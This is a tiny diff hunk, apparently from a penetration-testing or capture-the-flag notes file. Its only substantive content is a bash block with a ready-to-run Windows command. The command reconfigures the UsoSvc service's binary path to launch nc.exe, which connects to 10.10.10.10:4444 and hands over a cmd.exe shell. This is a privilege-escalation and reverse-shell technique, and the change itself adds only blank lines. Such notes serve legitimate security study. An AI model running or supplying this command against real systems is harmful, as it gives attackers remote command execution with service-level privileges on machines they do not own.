@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:42.379030+00:00'
 ```bash
 sc.exe config UsoSvc binpath= "cmd /C C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
 ```
+
+
